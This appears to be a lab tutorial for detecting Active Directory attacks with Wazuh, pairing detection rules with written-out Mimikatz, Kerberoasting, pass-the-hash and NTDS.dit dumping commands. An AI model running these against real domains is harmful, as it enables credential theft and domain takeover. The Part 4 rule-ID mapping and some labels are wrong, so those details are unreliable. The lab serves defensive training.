
### 🎯 **OBJECTIVES**

Set up a lab environment consisting of 3 virtual machines, including:

| Operating System    | Role                                                      | Suggested IP   |
| ------------------- | --------------------------------------------------------- | -------------- |
| Ubuntu Server       | Wazuh Server (SIEM)                                       | `172.16.1.132` |
| Windows Server 2019 | Domain Controller (AD) + Wazuh Agent                      | `172.16.1.130` |
| Windows 10 Pro      | Compromised endpoint for attack simulations + Wazuh Agent | `172.16.1.131` |

---

### 🧱 **PART 1 – INFRASTRUCTURE SETUP**

#### 1️⃣ INSTALL WAZUH SERVER

#### 2️⃣ INSTALL WINDOWS SERVER 2019 & ACTIVE DIRECTORY

**Step 1: Set Hostname and Static IP**

* Hostname: `DC01`
* IP: `172.16.1.130`
* DNS: Point to itself

**Step 2: Install AD Domain Services**

* Open **Server Manager** → **Add roles and features** → Select **Active Directory Domain Services (AD DS)**.
* After installation → Select **Promote this server to a domain controller** → Create a new domain: `wazuhtest.com`.

**Step 3: Create User Accounts**

* `compromiseduser`: Member of the `Domain Users` & `Administrators` groups on the Win10 machine
* Assign permissions:

  * **Replicating Directory Changes**
  * **Replicating Directory Changes All**

**Step 4: Create Service Account with SPN**

```powershell
New-ADUser -Name "svcSQL" -SamAccountName svcSQL -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svcSQL -ServicePrincipalNames @{Add="MSSQLSvc/DC01.wazuhtest.com:1433"}
```

---

#### 3️⃣ INSTALL WINDOWS 10 PRO – ATTACK MACHINE

**Step 1: Set IP and Join Domain**

* IP: `172.16.1.131`
* Join domain: `wazuhtest.com` (using the `compromiseduser` account)

**Step 2: Install Tools**

* Download **Mimikatz** from GitHub: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
* Install **Python 3.10+** from [python.org](https://www.python.org)
* Download **kerberoast** script and wordlist from GitHub:

  * [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
  * Wordlist: `rockyou.txt` or create your own


---

### 🧩 **PART 2 – DETECTION RULES**

To detect AD attacks, we will create rules on the Wazuh server to identify IoCs in Windows security events and system events monitored by Sysmon.

#### **Sysmon Integration**

1. **Install Sysmon** from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) with the configuration file `sysmonconfig.xml`.

2. Run the following command to install Sysmon with the downloaded configuration file via PowerShell (run as administrator):

```powershell
.\sysmon.exe -accepteula -i sysmonconfig.xml
```

![alt text](/assets/image-3.png)

3. Configure the Wazuh agent to monitor Sysmon logs by adding the following lines to the `ossec.conf` file:

```xml
<ossec_config>
  <localfile>    
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</ossec_config>
```

4. Restart the Wazuh agent service to apply the changes:

```powershell
Restart-Service -Name wazuh
```


#### Wazuh server configuration
1. Add the following rules to the `/var/ossec/etc/rules/local_rules.xml` file on the Wazuh server to generate alerts on the Wazuh dashboard whenever an attacker performs any of the attacks mentioned above:

```xml
<group name="security_event, windows,">
 
  <!-- This rule detects DCSync attacks using windows security event on the domain controller -->
  <rule id="110001" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</field>
    <options>no_full_log</options>
    <description>Directory Service Access. Possible DCSync attack</description>
  </rule>
 
 <!-- This rule ignores Directory Service Access originating from machine accounts containing $ -->
 <rule id="110009" level="0">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</field>
    <field name="win.eventdata.SubjectUserName" type="pcre2">$$</field>
    <options>no_full_log</options>
    <description>Ignore all Directory Service Access that is originated from a machine account containing $</description>
  </rule>
 
  <!-- This rule detects Keberoasting attacks using windows security event on the domain controller -->
  <rule id="110002" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.TicketOptions" type="pcre2">0x40810000</field>
    <field name="win.eventdata.TicketEncryptionType" type="pcre2">0x17</field>
    <options>no_full_log</options>
    <description>Possible Keberoasting attack</description>
  </rule>
 
  <!-- This rule detects Golden Ticket attacks using windows security events on the domain controller -->
  <rule id="110003" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.LogonGuid" type="pcre2">{00000000-0000-0000-0000-000000000000}</field>
    <field name="win.eventdata.logonType" type="pcre2">3</field>
    <options>no_full_log</options>
    <description>Possible Golden Ticket attack</description>
  </rule>

  <!-- This rule detects when PsExec is launched remotely to perform lateral movement within the domain. The rule uses Sysmon events collected from the domain controller. -->
  <rule id="110004" level="12">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID" type="pcre2">17|18</field>
    <field name="win.eventdata.PipeName" type="pcre2">\\PSEXESVC</field>
    <options>no_full_log</options>
    <description>PsExec service launched for possible lateral movement within the domain</description>
  </rule>

  <!-- This rule detects NTDS.dit file extraction using a sysmon event captured on the domain controller -->
  <rule id="110006" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.commandLine" type="pcre2">NTDSUTIL</field>
    <description>Possible NTDS.dit file extraction using ntdsutil.exe</description>
  </rule>

  <!-- This rule detects Pass-the-ash (PtH) attacks using windows security event 4624 on the compromised endpoint -->
  <rule id="110007" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.LogonProcessName" type="pcre2">seclogo</field>
    <field name="win.eventdata.LogonType" type="pcre2">9</field>
    <field name="win.eventdata.AuthenticationPackageName" type="pcre2">Negotiate</field>
    <field name="win.eventdata.LogonGuid" type="pcre2">{00000000-0000-0000-0000-000000000000}</field>
    <options>no_full_log</options>
    <description>Possible Pass the hash attack</description>
  </rule>
  
  <!-- This rule detects credential dumping when the command sekurlsa::logonpasswords is run on mimikatz -->
  <rule id="110008" level="12">
    <if_sid>61612</if_sid>
    <field name="win.eventdata.TargetImage" type="pcre2">(?i)\\\\system32\\\\lsass.exe</field>
    <field name="win.eventdata.GrantedAccess" type="pcre2">(?i)0x1010</field>
    <description>Possible credential dumping using mimikatz</description>
  </rule>

</group>
```

2. Restart the Wazuh server to apply the changes:

```bash
systemctl restart wazuh-manager
```

---

## 🔥 **PART 3 – Active Directory Attack Simulation**

This section covers the simulation of common Active Directory (AD) attacks, including **DCSync**, **Golden Ticket**, and **Kerberoasting** attacks.


### 💣 **1. DCSync Attack**

DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:
* **Replicating Directory Changes**
* **Replicating Directory Changes All**

**📌 Prerequisites:**

* Must be run on the **Windows 10** machine using an account with sufficient privileges (e.g., **Domain Admin** or an account with the **Replicating Directory Changes** permission).

**⚙️ Steps:**

1. **Run Mimikatz as Administrator:**

```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:wazuhtest.com /user:Administrator
lsadump::dcsync /domain:wazuhtest.com /user:krbtgt
```

2. **Check for Successful Attack:**

   * If the command returns the **NTLM hash** for the **KRBTGT** account, the attack is successful.
   * This hash is a critical component for performing a **Golden Ticket** attack.

![DCSync Attack](/assets/image-4.png)
![NTLM Hash Extraction](/assets/image-5.png)

#### **Prevention**
What DCSync abuses is a common operation in Active Directory environments, as replications happen between Domain Controllers all the time; therefore, preventing DCSync out of the box is not an option. The only prevention technique against this attack is using solutions such as the [RPC Firewall](https://github.com/zeronetworks/rpcfirewall), a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall , we can only allow replications from Domain Controllers.

#### **Detection**
Detecting DCSync is easy because each Domain Controller replication generates an event with the ID 4662 . We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller. Here's the event generated from earlier when we ran Mimikatz ; it serves as a flag that a user account is performing this replication attempt:

![alt text](/assets/image-27.png)

Since replications occur constantly, we can avoid false positives by ensuring the followings:
- Either the property 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 or 19195a5b-6da0-11d0-afd3-00c04fd930c9 is [present in the event](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb).
- Whitelisting systems/accounts with a (valid) business reason for replicating, such as Azure AD Connect (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).

---

### 🎭 **2. Golden Ticket Attack**

Golden Ticket is an attack technique that allows an attacker to create valid TGT (Ticket Granting Ticket) for any user within a domain by using the password hash of the krbtgt account. The krbtgt account is a special system account used to sign all Kerberos tickets within the domain, and it cannot be deleted, renamed, or activated. If an attacker obtains this hash, they can generate TGTs with any privileges and maintain long-term access to the domain, including escalating from a child domain to a parent domain within the same forest.

**📌 Prerequisites:**

To perform a Kerberoasting attack, you need:
* /domain : the domain name of the target system (e.g., **wazuhtest.com**).
* /sid : the domain SID of the target system (e.g., **S-1-5-21-1234567890-1234567890-1234567890**).
* /rc4 : the NTLM hash of the krbtgt account (e.g., **D4C74594D841139D0F3C6A1A8E2B4B7F**).
* user: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)
* /id :  Relative ID (last part of SID ) for the user for whom Mimikatz will issue the ticket


**⚙️ Steps:**

1. **Create the Golden Ticket:**

```powershell
lsadump::dcsync /domain:wazuhtest.com /user:krbtgt
kerberos::golden /user:attacker /domain:wazuhtest.com /sid:<SID> /krbtgt:<HASH> /ptt
```

* Replace `<SID>` with the domain's **Security Identifier (SID)**.
* Replace `<HASH>` with the **KRBTGT** NTLM hash.

![Golden Ticket Creation](/assets/image-6.png)

2. **Validate the Ticket:**

```powershell
mimikatz # misc::cmd
```

* This command opens a command prompt session authenticated with the forged Kerberos ticket.

![Golden Ticket Authenticated Session](/assets/image-7.png)

3. **Verify the Loaded Ticket:**

```powershell
klist
```

* Check if the ticket is currently loaded in memory, confirming the ticket was successfully forged.

![Kerberos Ticket Verification](/assets/image-8.png)

#### **Prevention**

Preventing the creation of forged tickets is difficult as the KDC generates valid tickets using the same procedure. Therefore, once an attacker has all the required information, they can forge a ticket. Nonetheless, there are a few things we can and should do: 
- Block privileged users from authenticating to any device. 
- Periodically reset the password of the krbtgt account; the secrecy of this hash value is crucial to Active Directory. When resetting the password of krbtgt (regardless of the password's strength), it will always be overwritten with a new randomly generated and cryptographically secure one. Utilizing Microsoft's script for changing the password of krbtgt [KrbtgtKeys.ps1]([https://](https://github.com/microsoft/New-KrbtgtKeys.ps1)) is highly recommended as it has an audit mode that checks the domain for preventing impacts upon password change. It also forces DC replication across the globe so all Domain Controllers sync the new value instantly, reducing potential business disruptions. 
- Enforce SIDHistory filtering between the domains in forests to prevent the escalation from a child domain to a parent domain (because the escalation path involves abusing the SIDHistory property by setting it to that of a privileged group, for example, Enterprise Admins ). However, doing this may result in potential issues in migrating domains

#### Detection

Correlating user behavior is one of the most effective techniques for detecting forged ticket abuse. For instance, if we have a baseline of when and where a privileged account, like 'Administrator,' typically logs in, we can set alerts for any suspicious activity outside this pattern. Organizations using Privileged Access Workstations (PAWs) should closely monitor any privileged logins from non-PAW devices. Key event IDs to watch include 4624 (successful logon) and 4625 (failed logon).

While Domain Controllers do not log events when an attacker creates a Golden Ticket on a compromised machine, they will log successful logon attempts when the attacker uses the forged ticket to access other systems. For example:

* **Unusual Successful Logon (Event ID 4624)**

  * An unexpected login from a new IP address or device, indicating a possible Golden Ticket attack.

![alt text](/assets/image-28.png)

* **TGS Requests Without Prior TGT**

  * Signs include TGS requests for an account like 'Administrator' without a corresponding TGT, or a TGT with an unusually long lifetime (e.g., 10 years).
  * **Example:** An attacker using a forged Golden Ticket with the `krbtgt` hash to request TGS for 'Administrator'.

* **SID Changes in Kerberos Tickets (Event ID 4675)**

  * A TGT or TGS containing an SID that differs from the current domain SID, indicating possible cross-domain privilege escalation.
  * **Example:** An account from the child domain `child.example.com` attempting to access the parent domain `example.com`.

* **Direct File Access (Event ID 5140)**

  * Direct attempts to access administrative shares (e.g., `C$` on a Domain Controller), often associated with lateral movement.
  * **Examples:**

    ```powershell
    dir \\dc1\c$
    Get-ChildItem \\dc1\c$
    ```
  * **Analysis:** These actions often indicate attempts to move laterally within the network.


---

### 🔑 **3. Kerberoasting Attack**

Kerberoasting is an attack technique that allows an attacker to request encrypted service tickets for service accounts, which can then be cracked offline to recover plaintext credentials.

**📌 Prerequisites:**

* A domain-joined machine and a domain user account (e.g., **compromiseduser**).

**⚙️ Steps:**

1. **Enumerate ServicePrincipalNames (SPNs):**

```powershell
PS C:\Windows\system32> cd C:\Users\<USERNAME>\Downloads\kerberoast-master
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> .\GetUserSPNs.ps1
```

* This script lists all service accounts with SPNs, which can be targeted for ticket extraction.

![SPN Enumeration](/assets/image-9.png)

2. **Request TGS Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "http/Windows10"
```

* This requests a **Kerberos TGS** ticket for the identified service account.

![TGS Ticket Request](/assets/image-10.png)

3. **Extract the Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> C:\Users\<USERNAME>\Downloads\mimikatz_trunk\x64\mimikatz.exe
mimikatz # kerberos::list /export
```

* Extract the TGS ticket from memory for offline cracking.

![Ticket Extraction](/assets/image-11.png)

4. **Verify Extracted Tickets:**

```powershell
mimikatz # exit
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> Get-ChildItem
```

* List the extracted tickets to ensure they have been saved correctly.

![Ticket Verification](/assets/image-12.png)

5. **Crack the TGS Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> ./tgsrepcrack.py wordlist.txt 1-40a10000-<USERNAME>@http~Windows10-WAZUHTEST.COM.kirbi
```

* Use the **tgsrepcrack.py** script to crack the extracted ticket, replacing **wordlist.txt** with your password list.

![Ticket Cracking](/assets/image-13.png)


### 🔓 **4. Pass-the-Hash (PtH) Attack**

The **Pass-the-Hash (PtH)** attack is a credential theft technique that allows an attacker to authenticate as a user without knowing the plaintext password, but instead using the **NTLM hash** of the user's password. This technique is often used for lateral movement within a network, exploiting the NTLM authentication protocol.

#### **📂 Prerequisites:**

* A compromised Windows 10 endpoint with administrative privileges.
* Access to Mimikatz and PsTools.

#### **⚙️ Steps:**

1. **Download PsTools:**

   * Download **PsTools** from the [Microsoft Sysinternals website](https://learn.microsoft.com/en-us/sysinternals/downloads/pstools) to the compromised Windows 10 endpoint.

2. **Attempt Remote Command Execution:**

```powershell
.\PsExec.exe \\Windows2022DC.wazuhtest.com cmd
```

* Replace **Windows2022DC.wazuhtest.com** with the actual domain controller name.
* This initial attempt is expected to fail with an **Access Denied** message because the current user does not have sufficient privileges.

![Access Denied](/assets/image-17.png)

3. **Enable Mimikatz Logging and Privilege Escalation:**

```powershell
mimikatz # log passthehash.log
mimikatz # privilege::debug
```

* **log passthehash.log** enables logging for the current Mimikatz session.
* **privilege::debug** grants Mimikatz the required debug privileges to interact with LSASS.

![Privilege Escalation](/assets/image-16.png)

4. **Extract NTLM Hashes:**

```powershell
mimikatz # sekurlsa::logonpasswords
```

* Extracts credentials from the **LSASS** process memory, including **NTLM** hashes for all active sessions.
* Look for the **NTLM hash** of a domain administrator account.

![NTLM Hash Extraction](/assets/image-18.png)
![Administrator Hash Found](/assets/image-19.png)

5. **Perform the Pass-the-Hash Attack:**

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:wazuhtest.com /ntlm:<NTLM hash>
```

* Replace **<NTLM hash>** with the extracted hash of the **Administrator** account.
* This command opens a new command prompt authenticated as the target user without requiring the plaintext password.

![Pass-the-Hash Attack](/assets/image-20.png)

6. **Reconnect to the Domain Controller:**

```powershell
.\PsExec.exe \\windows-server.wazuhtest.com cmd
```

* Reattempt the connection to the domain controller.
* This time, the command should succeed, providing a remote shell with the privileges of the compromised domain administrator account.

![Successful Domain Controller Access](/assets/image-21.png)

7. **Verify the Session:**

```powershell
whoami
hostname
```

* Run these commands to confirm the current session is authenticated as the domain administrator, and you have successfully compromised the domain controller.

### 🔑 **5. NTDS.dit Password Extraction**

The **ntds.dit** file, located at \*\*C:\Windows\NTDS\*\*, is the Active Directory database on each domain controller. It stores critical directory data, including user credentials. Attackers can exploit this file to extract password hashes, allowing them to compromise user accounts without needing plaintext passwords. This attack typically follows an initial compromise, such as a **Pass-the-Hash** attack, to gain the necessary access to the domain controller’s file system.

#### **📂 Prerequisites:**

* Administrative access to the domain controller.
* **DSInternals PowerShell Module** installed for extracting password hashes.

#### **⚙️ Steps:**

1. **Exfiltrate the NTDS.dit File:**

   * Use the **ntdsutil** command to create a copy of the **ntds.dit** database, along with the **SYSTEM** and **SECURITY** registry hives required to decrypt it.

```powershell
C:\Windows\system32> NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Files" "q" "q"
```

* This command creates a copy of the NTDS database and registry files in the **C:\Files** directory.
* The **SYSTEM** hive is critical, as it contains the boot key required to decrypt the **ntds.dit** file.

![NTDSUTIL Command](/assets/image-22.png)

2. **Extract the Boot Key:**

   * Open PowerShell and run the following commands to install the **DSInternals** module and extract the boot key:

```powershell
C:\Windows\system32> powershell
PS C:\Windows\system32> Install-Module DSInternals -Force

PS C:\Windows\system32> $Key = Get-BootKey -SystemHiveFilePath C:\Files\registry\SYSTEM
```

* The **Get-BootKey** command reads the **SYSTEM** hive to retrieve the boot key needed to decrypt **ntds.dit**.
* Ensure that the path to the **SYSTEM** file is correct.

![Boot Key Extraction](/assets/image-23.png)

3. **Extract Password Hashes:**

   * With the boot key extracted, run the following command to dump all password hashes from the **ntds.dit** file:

```powershell
PS C:\Windows\system32> Get-ADDBAccount -All -Bootkey $Key -DBPath 'C:\Files\Active Directory\ntds.dit'
```

* This command retrieves all stored password hashes from the **ntds.dit** file.
* Look for the **NTLM** hashes of high-privilege accounts, such as the **Administrator**.

![NTLM Hash Extraction](/assets/image-24.png)
![Administrator Hash Found](/assets/image-25.png)



---

## 🛡️ **PART 4 – DETECTION WITH WAZUH**

### 🖥️ **Accessing the Wazuh Web Interface**

1. **Log in to the Wazuh Dashboard:**

   * Open a browser and navigate to **[https://172.16.1.132/](https://172.16.1.132/)**.
   * Use your Wazuh credentials to log in.

2. **Viewing Windows Agent Logs:**

   * Go to the **Discover** section to view logs from the Windows agent.
   * Set the **Index Pattern** to **wazuh-alerts-**\* to filter Wazuh alerts.

3. **Filtering Specific Logs:**

   * Use the following **rule IDs** to filter logs related to AD attacks:

     * **110009** – DCSync attack detection
     * **110002** – Golden Ticket attack detection
     * **110003** – Kerberoasting attack detection

4. **Review the Logs:**

   * Review the filtered logs to verify detection for each attack technique.

![Wazuh Alerts - DCSync Detection](/assets/image-14.png)

![Wazuh Alerts - Golden Ticket Detection](/assets/image-15.png)

![Wazuh Alerts](/assets/image-26.png)

---
